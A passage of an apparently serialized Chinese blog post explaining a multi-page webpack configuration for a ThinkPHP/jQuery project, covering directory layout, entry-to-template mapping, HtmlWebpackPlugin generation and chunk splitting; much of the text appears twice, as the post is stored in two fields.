好像是拿来缓存文件用的？vue-cli存在的</span></span><br></pre></td></tr></table></figure>\n<p>当然，我目前开发的项目是半路引入<code>webpack</code>的，大部分都还是<code>jQuery</code>那套东西、但是我还是秉着<strong>关注点分离</strong>的原则，将<code>html</code>、<code>css</code>、<code>js</code>按页面来放了，不再使用老掉牙的按文件类型来放、那是因为有了<code>webpack</code>的打包才可以这么随意。除了分离出来的模板（<code>ThinkPHP</code>用<code>&lt;include file=&quot;&quot;/&gt;</code>标签来引入模板）文件，js和css都是放到同模板名的Public/dev/js/modules目录里了，这样一来可以直接像这样</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">require</span>( <span class=\"string\">'./style.less'</span> );</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>先在js文件的头部引入这个组件的样式文件，再来写js代码，至少我们在使用组件的时候不必关心css了（下篇文章会讲讲重构后如何连html也不关注了）</p>\n<h4><span id=\"images\">images</span></h4>\n<p>这里为什么会有一个<code>images</code>目录看起来很多余呢，那是因为我们的php模板里的图片标签<code>src</code>前面都带了一个<code>php</code>的系统变量，<code>webpack</code>插件的静态分析是无法识别这里的路径的，所以保留了这个目录，在打包后用插件拷贝到打包目录里</p>\n<hr>\n<p>2018年1月19日更新，后面发现了一个有趣的插件，可以在这里识别这些后端的常量代码如下（需要配合使用html-loader）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> webpack.NormalModuleReplacementPlugin(</span><br><span class=\"line\">  /__RESPATH__/,</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> resource </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 我们在这里直接替换这个常量让webpack插件（file-loader）去解析</span></span><br><span class=\"line\">    resource.request = resource.request.replace( <span class=\"regexp\">/^\\.\\/__RESPATH__/</span>, path.resolve( __dirname, <span class=\"string\">'..'</span>, <span class=\"string\">'Public/dev'</span> ) );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">),</span><br></pre></td></tr></table></figure>\n<p>还有一些疑难杂症的url例如(只针对html-loader)</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">__RESPATH__</span>/images/hy&#123;$<span class=\"variable\">_SESSION</span>[<span class=\"string\">'vip'</span>]|<span class=\"keyword\">default</span>=<span class=\"string\">'0'</span>&#125;.png</span><br></pre></td></tr></table></figure>\n<p>这种插件也是无法识别的，而且html-loader目前也不支持url筛选，估计是要等到1.0版本吧，解决方案也是很绕，修改一句它的源码（为了方便就把它整个代码拷贝出来吧）<br>\n/html-loader/index.js<br>\n54行的位置大概是，在</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( !loaderUtils.isUrlRequest( link.value, root ) ) <span class=\"keyword\">return</span>;</span><br></pre></td></tr></table></figure>\n<p>下面添加一句</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( link.value.match( <span class=\"regexp\">/\\&#123;\\$[\\s\\S]*?\\&#125;/</span> ) ) <span class=\"keyword\">return</span>;</span><br></pre></td></tr></table></figure>\n<p>将匹配到{$xxxx}这种url直接跳过不解析，当然如果你是常量就做替换，这样就完美解决问题，等到html-loader更新支持筛选我们再切回去</p>\n<hr>\n<h4><span id=\"page\">page</span></h4>\n<p>然后是<code>page</code>这个目录，这个目录是拿来存放我们页面的三剑客的，比如有一个叫<code>index</code>的目录，里面有<code>css</code>、<code>js</code>、<code>html</code>文件，这里的<code>index</code>可以看作是一个页面目录，也可以看作是一个分类，如果是分类，那下面就应该是页面了，html里不应该引用<code>css</code>文件和<code>js</code>文件，因为webpack会帮我们插入生成新的html到我们指定的目录里</p>\n<p>最重要的就是<code>build</code>目录下的了</p>\n<h4><span id=\"configjs\">config.js</span></h4>\n<p><code>proxyTable</code>项我已经在上篇文章中讲过了，这里就不赘述了</p>\n<h4><span id=\"mappingjs\">mapping.js</span></h4>\n<p>这个文件就是描述我们<code>entry</code>也就是入口文件和html模板之间的关系映射的文件的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 微知首页</span></span><br><span class=\"line\">  <span class=\"string\">'Index'</span>: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对应到Public/dev/js/page的文件夹名称</span></span><br><span class=\"line\">    file: <span class=\"string\">'main'</span>,</span><br><span class=\"line\">    <span class=\"comment\">// 视图层的文件名称，默认为index</span></span><br><span class=\"line\">    viewFile: <span class=\"string\">'index'</span>,</span><br><span class=\"line\">    disable: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    templateOutput: <span class=\"string\">'Index'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"string\">'EditText'</span>: &#123;</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'editor'</span> ],</span><br><span class=\"line\">    disable: <span class=\"literal\">false</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 编辑模板</span></span><br><span class=\"line\">  <span class=\"string\">'Template'</span>: &#123;</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'editor'</span> ],</span><br><span class=\"line\">    disable: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 默认模板</span></span><br><span class=\"line\">  <span class=\"string\">'GzhArtStyle'</span>: &#123;</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'editor'</span> ],</span><br><span class=\"line\">    disable: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里导出的每个对象的键值都对应了<code>page</code>目录里的名字，下面的<code>file</code>字段对应的入口js文件名称，默认为<code>main</code>，<code>viewFile</code>对应的是html模板名称，默认为<code>index</code>，这里很有用，因为在<code>ThinkPHP</code>的<code>View</code>目录里模板部分文件夹的，所以我们配合<code>templateOutput</code>把html输出过去就不存在目录了，<code>templateOutput</code>的默认值为这个对象的键值如Index默认为Index。<code>disable</code>字段是开发模式使用的，当运行<code>npm run dev</code>命令时会自动扫描这个字段，若为<code>false</code>才会启动，如果全部都为false，那么你页面越多造成性能开销就越大，所以除非你同时去开发几个页面，这里建议启动的页面不超过5个，其他页面若要运行，提前<code>npm run build</code>一次让它跑编译后的代码就好了。<code>chunks</code>字段是用来标记当前页面依赖的除了共有<code>chunks</code>需要依赖的其他<code>chunks</code>，上面的有chunks字段的三个页面都是引用了百度编辑器，因为百度编辑器的包都太大了，所以不建议抽取到公用的chunk里，这里的配置在<code>webpack.prod.cfg.js</code>文件里有单独配置。</p>\n<h4><span id=\"utilsjs\">utils.js</span></h4>\n<p>这个文件主要是<code>getHtmlWebpackPlugins</code>方法，配合注释您就能看懂刚才的mapping配置都怎么用的了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.getHtmlWebpackPlugins = <span class=\"function\">(<span class=\"params\"> rename </span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> HtmlWebpackPlugins = [];</span><br><span class=\"line\">  <span class=\"built_in\">Object</span>.keys( mapping ).forEach( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> name </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果不是开发环境 就全部打包</span></span><br><span class=\"line\">    <span class=\"comment\">// 如果是开发环境 就根据disable来进行打包</span></span><br><span class=\"line\">    ( process.env.NODE_ENV !== <span class=\"string\">'development'</span> ||</span><br><span class=\"line\">      !mapping[ name ].disable ) &amp;&amp;</span><br><span class=\"line\">    HtmlWebpackPlugins.push(</span><br><span class=\"line\">      <span class=\"keyword\">new</span> HtmlWebpackPlugin( &#123;</span><br><span class=\"line\">        alwaysWriteToDisk: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"comment\">// php端使用到的模板</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果是其他目录在此修改路径</span></span><br><span class=\"line\">        filename: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/Application/Home/View/<span class=\"subst\">$&#123;mapping[ name ].templateOutput ? mapping[ name ].templateOutput : name&#125;</span>/<span class=\"subst\">$&#123;mapping[name].viewFile || <span class=\"string\">'index'</span>&#125;</span>.html`</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 插件用的模板文件</span></span><br><span class=\"line\">        template: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/<span class=\"subst\">$&#123;config.$d&#125;</span>/js/page/<span class=\"subst\">$&#123;name&#125;</span>/<span class=\"subst\">$&#123;mapping[name].viewFile || <span class=\"string\">'index'</span>&#125;</span>.<span class=\"subst\">$&#123;mapping[name].templateType || <span class=\"string\">'html'</span>&#125;</span>`</span>,</span><br><span class=\"line\">        chunks: ( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ( !rename ) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//let chunks = [ 'vendor.npm', 'vendor.TP', 'manifest', 'vendor.modules' ];</span></span><br><span class=\"line\">            <span class=\"keyword\">let</span> chunks = [ <span class=\"string\">'vendor.modules'</span>, <span class=\"string\">'vendor'</span>, <span class=\"string\">'manifest'</span> ];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( mapping[ name ].chunks ) &#123;</span><br><span class=\"line\">              chunks = chunks.concat( mapping[ name ].chunks );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> chunks;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> [];</span><br><span class=\"line\">        &#125;() ).concat( [ <span class=\"string\">`<span class=\"subst\">$&#123;rename ? config.dev.entryPrefix : <span class=\"string\">''</span>&#125;</span><span class=\"subst\">$&#123;name&#125;</span>`</span> ] ),</span><br><span class=\"line\">        <span class=\"comment\">// 手工排序</span></span><br><span class=\"line\">        chunksSortMode: <span class=\"string\">'manual'</span>,</span><br><span class=\"line\">        inject: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        showErrors: <span class=\"literal\">false</span></span><br><span class=\"line\">      &#125; ) );</span><br><span class=\"line\">  &#125; );</span><br><span class=\"line\">  <span class=\"keyword\">return</span> HtmlWebpackPlugins;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>alwaysWriteToDisk</code>这个字段是我们能前后端结合开发的关键，没有使用后端模板的项目真的做到前后分离时是不需要这个字段的，因为PHP会读这个文件再渲染数据出来给浏览器</p>\n<h4><span id=\"webpackbasecfgjs-webpackdevcfgjs\">webpack.base.cfg.js、webpack.dev.cfg.js</span></h4>\n<p>都是些老生常谈的配置，这里就不赘述了。值得注意的是<code>dev.client.js</code>这个文件被我删了，因为使用了<code>alwaysWriteToDisk</code>实时写入的功能，改变css文件和js文件都会强制刷新，那热更新完全就没法用了，所以html文件的变化还是需要手动刷新的</p>\n<h4><span id=\"webpackprodcfgjs\">webpack.prod.cfg.js</span></h4>\n<p><code>HtmlWebpackPlugin</code>这个插件确实是有多少页面就要插入多少个实例进去的，所以直接</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...utils.getHtmlWebpackPlugins( <span class=\"literal\">false</span> ),</span><br></pre></td></tr></table></figure>\n<p>展开这个数组就好了，这里传入的布尔参数是为了区分开发模式和build模式，传入<code>true</code>只会有一个chunk被包含进来，就是当前页面依赖的所有js和css等<br>\n然后是<code>chunks</code></p>\n<h5><span id=\"manifest\">manifest</span></h5>\n<p>有的页面因为太简单并没有依赖太多共用的js，但是依赖了共用的css，所以这个chunk仅仅是为了抽取css文件用，造成引用了一个空的js，暂时没有想到好的解决办法，欢迎再issues提出改进建议</p>\n<h5><span id=\"vendormodules\">vendor.modules</span></h5>\n<p>这个chunk是为了抽取我们自己写的业务组件、在修改业务组件后能够很好的利用缓存只更新这一个文件</p>\n<h5><span id=\"commonchunk\">commonChunk</span></h5>\n<p>上文<code>mapping</code>里的chunks字段就是这里配置的，如果还有其他局部共用的大chunk可以在这里再配置一个</p>\n<h5><span id=\"vendor\">vendor</span></h5>\n<p>vendor就是拿来放置第三方插件的，这里抽取了npm和lib里面的，当项目稳定后处于一个稳定的维护期，没有较大改动时，这个文件就可以长期缓存在用户的电脑里了。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> CopyWebpackPlugin( [ &#123;</span><br><span class=\"line\">  <span class=\"keyword\">from</span>: path.resolve( __dirname, <span class=\"string\">`../<span class=\"subst\">$&#123;config.$d&#125;</span>/images`</span> ),</span><br><span class=\"line\">  to: <span class=\"string\">`<span class=\"subst\">$&#123;config.build.assetsSubDirectory&#125;</span>/images`</span>,</span><br><span class=\"line\">  ignore: [ <span class=\"string\">'.*'</span> ]</span><br><span class=\"line\">&#125; ] ),</span><br></pre></td></tr></table></figure>\n<p>上面的代码就是拷贝images这个目录到我们打包生成的目录里，防止资源丢失的问题</p>\n<hr>\n<p>这个脚手架很可能无法直接运行在你的项目里，但是能为你的多页入口的<code>website</code>提供一个很好的引入<code>webpack</code>的思路</p>\n<p>嗯，留下仓库<a href=\"https://github.com/Ryuurock/vue-muilt-page-config\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<p>have fun ~~</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>webpack</code>的流行给前端开发减少了许多不必要的工作，<code>webpack</code>可以让我们更纯粹的关注我们的代码，但是很多人认为它更适合单页应用，主要有以下一些痛点</p>\n<ul>\n<li>如果模板是后台管理的生成的怎么办</li>\n<li>我目前没有使用任何模块化的开发方式，或使用了模块加载器（如<code>seajs</code>、<code>requireJs</code>等）</li>\n</ul>\n<p>其实第二点我已经在上篇文章中讲过了，如果平滑的过渡到<code>webpack</code>，痛点一也解释过，只是没有详细的说明，此次分享一个完整的配置，来应对你的多页项目。不管是<code>jsp</code>、<code>php</code>、<code>html</code>、<code>xshtml</code>都可以通过具体的配置来使用<code>webpack</code>，为什么如此青睐<code>webpack</code>，在我看来热<strong>更新技术</strong>、<code>less</code>、<code>sass</code>、<code>es6</code>、<code>es7</code>的引入是最吸引我的（尝试过使用<code>gulp</code>、但是感觉并没有<code>webpack</code>这种一站式服务来得顺手），下面我详细讲述下下面一些配置的用途，部分代码来自<a href=\"https://github.com/vuejs/vue-cli\" target=\"_blank\" rel=\"noopener\">vue-cli</a>。</p>\n<figure class=\"highlight delphi\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├─build                 <span class=\"comment\">// webpack的配置文件存放目录</span></span><br><span class=\"line\">├─<span class=\"keyword\">Public</span>                <span class=\"comment\">// 我们的前端资源存放目录</span></span><br><span class=\"line\">│  ├─dev                <span class=\"comment\">// 源码存放目录（可以改名为src）</span></span><br><span class=\"line\">│  │  ├─css             <span class=\"comment\">// 一些共用的css文件，共用才放这里哦</span></span><br><span class=\"line\">│  │  ├─font            <span class=\"comment\">// 字体文件</span></span><br><span class=\"line\">│  │  ├─images          <span class=\"comment\">// 图片文件</span></span><br><span class=\"line\">│  │  └─js              <span class=\"comment\">// js文件</span></span><br><span class=\"line\">│  │      ├─libs        <span class=\"comment\">// npm里没有的第三方插件或库</span></span><br><span class=\"line\">│  │      ├─modules     <span class=\"comment\">// 项目的业务组件存放目录</span></span><br><span class=\"line\">│  │      └─page        <span class=\"comment\">// 页面的目录</span></span><br><span class=\"line\">│  │          └─<span class=\"keyword\">Index</span>   <span class=\"comment\">// 具体的页面名称</span></span><br><span class=\"line\">│  └─dist               <span class=\"comment\">// 编译后的存放目录</span></span><br><span class=\"line\">└─<span class=\"keyword\">static</span>                <span class=\"comment\">// 好像是拿来缓存文件用的？vue-cli存在的</span></span><br></pre></td></tr></table></figure>\n<p>当然，我目前开发的项目是半路引入<code>webpack</code>的，大部分都还是<code>jQuery</code>那套东西、但是我还是秉着<strong>关注点分离</strong>的原则，将<code>html</code>、<code>css</code>、<code>js</code>按页面来放了，不再使用老掉牙的按文件类型来放、那是因为有了<code>webpack</code>的打包才可以这么随意。除了分离出来的模板（<code>ThinkPHP</code>用<code>&lt;include file=&quot;&quot;/&gt;</code>标签来引入模板）文件，js和css都是放到同模板名的Public/dev/js/modules目录里了，这样一来可以直接像这样</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">require</span>( <span class=\"string\">'./style.less'</span> );</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>先在js文件的头部引入这个组件的样式文件，再来写js代码，至少我们在使用组件的时候不必关心css了（下篇文章会讲讲重构后如何连html也不关注了）</p>\n<h4>images</h4>\n<p>这里为什么会有一个<code>images</code>目录看起来很多余呢，那是因为我们的php模板里的图片标签<code>src</code>前面都带了一个<code>php</code>的系统变量，<code>webpack</code>插件的静态分析是无法识别这里的路径的，所以保留了这个目录，在打包后用插件拷贝到打包目录里</p>\n<hr>\n<p>2018年1月19日更新，后面发现了一个有趣的插件，可以在这里识别这些后端的常量代码如下（需要配合使用html-loader）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> webpack.NormalModuleReplacementPlugin(</span><br><span class=\"line\">  /__RESPATH__/,</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> resource </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 我们在这里直接替换这个常量让webpack插件（file-loader）去解析</span></span><br><span class=\"line\">    resource.request = resource.request.replace( <span class=\"regexp\">/^\\.\\/__RESPATH__/</span>, path.resolve( __dirname, <span class=\"string\">'..'</span>, <span class=\"string\">'Public/dev'</span> ) );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">),</span><br></pre></td></tr></table></figure>\n<p>还有一些疑难杂症的url例如(只针对html-loader)</p>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">__RESPATH__</span>/images/hy&#123;$<span class=\"variable\">_SESSION</span>[<span class=\"string\">'vip'</span>]|<span class=\"keyword\">default</span>=<span class=\"string\">'0'</span>&#125;.png</span><br></pre></td></tr></table></figure>\n<p>这种插件也是无法识别的，而且html-loader目前也不支持url筛选，估计是要等到1.0版本吧，解决方案也是很绕，修改一句它的源码（为了方便就把它整个代码拷贝出来吧）<br>\n/html-loader/index.js<br>\n54行的位置大概是，在</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( !loaderUtils.isUrlRequest( link.value, root ) ) <span class=\"keyword\">return</span>;</span><br></pre></td></tr></table></figure>\n<p>下面添加一句</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( link.value.match( <span class=\"regexp\">/\\&#123;\\$[\\s\\S]*?\\&#125;/</span> ) ) <span class=\"keyword\">return</span>;</span><br></pre></td></tr></table></figure>\n<p>将匹配到{$xxxx}这种url直接跳过不解析，当然如果你是常量就做替换，这样就完美解决问题，等到html-loader更新支持筛选我们再切回去</p>\n<hr>\n<h4>page</h4>\n<p>然后是<code>page</code>这个目录，这个目录是拿来存放我们页面的三剑客的，比如有一个叫<code>index</code>的目录，里面有<code>css</code>、<code>js</code>、<code>html</code>文件，这里的<code>index</code>可以看作是一个页面目录，也可以看作是一个分类，如果是分类，那下面就应该是页面了，html里不应该引用<code>css</code>文件和<code>js</code>文件，因为webpack会帮我们插入生成新的html到我们指定的目录里</p>\n<p>最重要的就是<code>build</code>目录下的了</p>\n<h4>config.js</h4>\n<p><code>proxyTable</code>项我已经在上篇文章中讲过了，这里就不赘述了</p>\n<h4>mapping.js</h4>\n<p>这个文件就是描述我们<code>entry</code>也就是入口文件和html模板之间的关系映射的文件的</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 微知首页</span></span><br><span class=\"line\">  <span class=\"string\">'Index'</span>: &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 对应到Public/dev/js/page的文件夹名称</span></span><br><span class=\"line\">    file: <span class=\"string\">'main'</span>,</span><br><span class=\"line\">    <span class=\"comment\">// 视图层的文件名称，默认为index</span></span><br><span class=\"line\">    viewFile: <span class=\"string\">'index'</span>,</span><br><span class=\"line\">    disable: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    templateOutput: <span class=\"string\">'Index'</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"string\">'EditText'</span>: &#123;</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'editor'</span> ],</span><br><span class=\"line\">    disable: <span class=\"literal\">false</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 编辑模板</span></span><br><span class=\"line\">  <span class=\"string\">'Template'</span>: &#123;</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'editor'</span> ],</span><br><span class=\"line\">    disable: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 默认模板</span></span><br><span class=\"line\">  <span class=\"string\">'GzhArtStyle'</span>: &#123;</span><br><span class=\"line\">    chunks: [ <span class=\"string\">'editor'</span> ],</span><br><span class=\"line\">    disable: <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>这里导出的每个对象的键值都对应了<code>page</code>目录里的名字，下面的<code>file</code>字段对应的入口js文件名称，默认为<code>main</code>，<code>viewFile</code>对应的是html模板名称，默认为<code>index</code>，这里很有用，因为在<code>ThinkPHP</code>的<code>View</code>目录里模板部分文件夹的，所以我们配合<code>templateOutput</code>把html输出过去就不存在目录了，<code>templateOutput</code>的默认值为这个对象的键值如Index默认为Index。<code>disable</code>字段是开发模式使用的，当运行<code>npm run dev</code>命令时会自动扫描这个字段，若为<code>false</code>才会启动，如果全部都为false，那么你页面越多造成性能开销就越大，所以除非你同时去开发几个页面，这里建议启动的页面不超过5个，其他页面若要运行，提前<code>npm run build</code>一次让它跑编译后的代码就好了。<code>chunks</code>字段是用来标记当前页面依赖的除了共有<code>chunks</code>需要依赖的其他<code>chunks</code>，上面的有chunks字段的三个页面都是引用了百度编辑器，因为百度编辑器的包都太大了，所以不建议抽取到公用的chunk里，这里的配置在<code>webpack.prod.cfg.js</code>文件里有单独配置。</p>\n<h4>utils.js</h4>\n<p>这个文件主要是<code>getHtmlWebpackPlugins</code>方法，配合注释您就能看懂刚才的mapping配置都怎么用的了</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.getHtmlWebpackPlugins = <span class=\"function\">(<span class=\"params\"> rename </span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> HtmlWebpackPlugins = [];</span><br><span class=\"line\">  <span class=\"built_in\">Object</span>.keys( mapping ).forEach( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> name </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 如果不是开发环境 就全部打包</span></span><br><span class=\"line\">    <span class=\"comment\">// 如果是开发环境 就根据disable来进行打包</span></span><br><span class=\"line\">    ( process.env.NODE_ENV !== <span class=\"string\">'development'</span> ||</span><br><span class=\"line\">      !mapping[ name ].disable ) &amp;&amp;</span><br><span class=\"line\">    HtmlWebpackPlugins.push(</span><br><span class=\"line\">      <span class=\"keyword\">new</span> HtmlWebpackPlugin( &#123;</span><br><span class=\"line\">        alwaysWriteToDisk: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        <span class=\"comment\">// php端使用到的模板</span></span><br><span class=\"line\">        <span class=\"comment\">// 如果是其他目录在此修改路径</span></span><br><span class=\"line\">        filename: <span class=\"string\">`<span class=\"subst\">$&#123;ROOT&#125;</span>/Application/Home/View/<span class=\"subst\">$&#123;mapping[ name ].templateOutput ? mapping[ name ].templateOutput : name&#125;</span>/<span class=\"subst\">$&#123;mapping[name].viewFile || <span class=\"string\">'index'</span>&#125;</span>.html`</span>,</span><br><span class=\"line\">        <span class=\"comment\">// 